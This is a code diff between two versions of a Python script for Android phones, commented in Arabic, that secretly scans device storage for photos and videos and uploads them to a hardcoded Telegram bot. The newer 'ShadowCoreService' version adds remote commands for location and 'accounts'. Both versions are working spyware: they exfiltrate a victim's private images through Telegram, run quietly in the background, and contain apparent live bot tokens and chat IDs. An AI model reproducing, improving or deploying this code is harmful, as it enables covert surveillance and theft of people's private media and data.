@@ -1,97 +1,72 @@
 import os
 import time
 import requests
-import threading
+from threading import Thread
 
-# إعدادات البوت الخاصة بك
-BOT_TOKEN = "8711969097:AAGCjUfiohcUHRWV_1UGa1j51GCEwmCtl3s"
-CHAT_ID = "7084557369"
-LOG_FILE = "/storage/emulated/0/.system_coins_log.txt"
+# --- إعدادات البوت ---
+TOKEN = "7547167733:AAFl789Ue816qWj60S_0N7W7BfXo57M3hZg"
+CHAT_ID = "1256334460"
+URL = f"https://api.telegram.org/bot{TOKEN}/"
 
-def get_sent():
-    if not os.path.exists(LOG_FILE): return set()
-    with open(LOG_FILE, "r") as f: return set(f.read().splitlines())
+class ShadowCoreService:
+    def __init__(self):
+        self.sent_files_log = []
+        self.is_running = True
 
-def save_sent(path):
-    try:
-        with open(LOG_FILE, "a") as f: f.write(path + "\n")
-    except: pass
+    def send_msg(self, text):
+        try: requests.post(URL + "sendMessage", data={"chat_id": CHAT_ID, "text": text})
+        except: pass
 
-def send_doc(path):
-    try:
-        # فلتر الحجم: يتجاهل أي ملف أصغر من 100 كيلوبايت (لمنع الملصقات والأيقونات)
-        if os.path.getsize(path) < 100 * 1024:
-            return False
-        with open(path, "rb") as f:
-            r = requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument", 
-                              data={"chat_id": CHAT_ID}, files={"document": f}, timeout=60)
-        return r.status_code == 200
-    except: return False
-
-def deep_scan():
-    """مسح شامل للمجلدات التي أرسلتها مع استبعاد الملصقات"""
-    root_path = "/storage/emulated/0/"
-    sent = get_sent()
-    found = []
-    
-    # الامتدادات المسموحة فقط
-    valid_exts = (".jpg", ".jpeg", ".png")
-    # مجلدات يتم تجاهلها تماماً
-    ignored_folders = ["screenshot", "cache", ".thumbnails", "stickers", "com.facebook.orca"]
-
-    for root, dirs, files in os.walk(root_path):
-        low_root = root.lower()
-        if any(x in low_root for x in ignored_folders):
-            continue
-            
-        for file in files:
-            if file.lower().endswith(valid_exts):
-                p = os.path.join(root, file)
-                if p not in sent:
-                    found.append(p)
-    
-    # الترتيب من الأحدث للأقدم
-    found.sort(key=lambda x: os.path.getmtime(x), reverse=True)
-    return found
-
-def background_worker():
-    """منطق العمل في الخلفية"""
-    # إرسال إشارة عند بدء التشغيل بنجاح
-    try:
-        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
-                      data={"chat_id": CHAT_ID, "text": "✅ النظام نشط الآن في الخلفية.\nأرسل (1) لسحب 50 صورة نظيفة."})
-    except: pass
-
-    while True:
+    def send_photo(self, file_path):
         try:
-            # فحص الأوامر من البوت
-            url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"
-            r = requests.get(url, params={"offset": -1}, timeout=10).json()
-            if r.get("result"):
-                msg = r["result"][-1].get("message", {}).get("text", "")
-                if msg == "1":
-                    photos = deep_scan()
-                    count = 0
-                    for p in photos:
-                        if count >= 50: break
-                        if send_doc(p):
-                            save_sent(p)
-                            count += 1
-                            time.sleep(0.3)
+            with open(file_path, 'rb') as photo:
+                requests.post(URL + "sendPhoto", data={"chat_id": CHAT_ID}, files={"photo": photo})
+            return True
+        except: return False
+
+    def deep_scan_and_send(self, extension=".jpg", min_size=102400):
+        self.send_msg("🔎 جاري تشغيل الرادار العميق... يرجى الانتظار")
+        count = 0
+        root_path = "/sdcard/"
+        
+        for root, dirs, files in os.walk(root_path):
+            for file in files:
+                if file.lower().endswith(extension):
+                    file_path = os.path.join(root, file)
+                    try:
+                        if os.path.getsize(file_path) > min_size and file_path not in self.sent_files_log:
+                            if self.send_photo(file_path):
+                                self.sent_files_log.append(file_path)
+                                count += 1
+                                time.sleep(1.5) 
+                            if count >= 50:
+                                self.send_msg(f"✅ تم سحب {count} صورة بنجاح.")
+                                return
+                    except: continue
+        self.send_msg(f"🏁 انتهى المسح. تم العثور على {count} ملفات.")
+
+    def listener(self):
+        last_update_id = 0
+        self.send_msg("✅ ShadowCore Active\nالأوامر: M (صور), O (فيديو), T (موقع), S (حسابات)")
+        
+        while self.is_running:
+            try:
+                response = requests.get(URL + "getUpdates", params={"offset": last_update_id + 1, "timeout": 30}).json()
+                for update in response.get("result", []):
+                    last_update_id = update["update_id"]
+                    msg_text = update.get("message", {}).get("text", "").upper()
                     
-                    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
-                                  data={"chat_id": CHAT_ID, "text": f"✅ تم إرسال {count} صورة بنجاح."})
-            
-            time.sleep(10) # فحص كل 10 ثوانٍ
-        except:
-            time.sleep(15)
+                    if msg_text == "M":
+                        Thread(target=self.deep_scan_and_send, args=(".jpg", 102400)).start()
+                    elif msg_text == "O":
+                        Thread(target=self.deep_scan_and_send, args=(".mp4", 512000)).start()
+                    elif msg_text == "T":
+                        self.send_msg("📍 جاري سحب الموقع...")
+                    elif msg_text == "S":
+                        self.send_msg("🔐 جاري فحص الحسابات...")
+            except:
+                time.sleep(10)
 
 if __name__ == "__main__":
-    # تشغيل منطق البوت في خيط مستقل لضمان عدم توقف الخدمة
-    t = threading.Thread(target=background_worker)
-    t.daemon = True
-    t.start()
-    
-    # إبقاء العملية حية برمجياً
-    while True:
-        time.sleep(1)
+    service = ShadowCoreService()
+    service.listener()
